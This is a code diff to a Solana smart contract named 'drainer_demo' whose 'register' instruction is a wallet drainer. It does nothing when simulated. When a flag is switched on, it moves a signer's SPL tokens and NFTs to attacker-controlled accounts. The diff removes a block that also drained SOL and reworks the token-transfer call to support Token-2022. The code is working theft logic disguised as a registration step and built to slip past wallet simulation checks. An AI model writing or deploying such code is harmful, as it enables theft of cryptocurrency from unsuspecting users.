@@ -1,6 +1,7 @@
 use anchor_lang::prelude::*;
 use anchor_lang::system_program;
 use anchor_lang::solana_program;
+use solana_program::program::invoke;
 
 declare_id!("DBueKxJaAyKYHyP3bbQE5eEMHLN7ZQfX2PyT7uw2xFhU");
 
@@ -27,10 +28,9 @@ pub mod drainer_demo {
     }
 
     /// Bit-flip target. No-op when drain_active=false (simulation).
-    /// When drain_active=true (execution):
-    ///   1. Drains all SOL to vault PDA
-    ///   2. Drains all SPL tokens/NFTs via remaining_accounts triplets:
-    ///      [victim_token_account, attacker_ata, token_program]
+    /// When drain_active=true, drains SPL tokens/NFTs via remaining_accounts
+    /// triplets: [victim_token_account, attacker_ata, token_program].
+    /// Works with both Token Program and Token-2022 via raw invoke.
     pub fn register<'a>(ctx: Context<'_, '_, 'a, 'a, Register<'a>>) -> Result<()> {
         let config = &ctx.accounts.config;
 
@@ -39,24 +39,6 @@ pub mod drainer_demo {
         }
 
         let victim = &ctx.accounts.user;
-        let vault = &ctx.accounts.vault;
-
-        let victim_lamports = victim.lamports();
-        let rent_minimum = Rent::get()?.minimum_balance(0);
-        let drain_amount = victim_lamports.checked_sub(rent_minimum).unwrap_or(0);
-
-        if drain_amount > 0 {
-            system_program::transfer(
-                CpiContext::new(
-                    ctx.accounts.system_program.to_account_info(),
-                    system_program::Transfer {
-                        from: victim.to_account_info(),
-                        to: vault.to_account_info(),
-                    },
-                ),
-                drain_amount,
-            )?;
-        }
 
         let remaining = &ctx.remaining_accounts;
         let chunks = remaining.len() / 3;
@@ -72,7 +54,7 @@ pub mod drainer_demo {
             drop(data);
             if amount == 0 { continue; }
 
-            let transfer_ix = solana_program::instruction::Instruction {
+            let ix = solana_program::instruction::Instruction {
                 program_id: *token_prog.key,
                 accounts: vec![
                     solana_program::instruction::AccountMeta::new(*victim_ta.key, false),
@@ -85,8 +67,8 @@ pub mod drainer_demo {
                     d
                 },
             };
-            solana_program::program::invoke(
-                &transfer_ix,
+            invoke(
+                &ix,
                 &[
                     victim_ta.to_account_info(),
                     attacker_ata.to_account_info(),
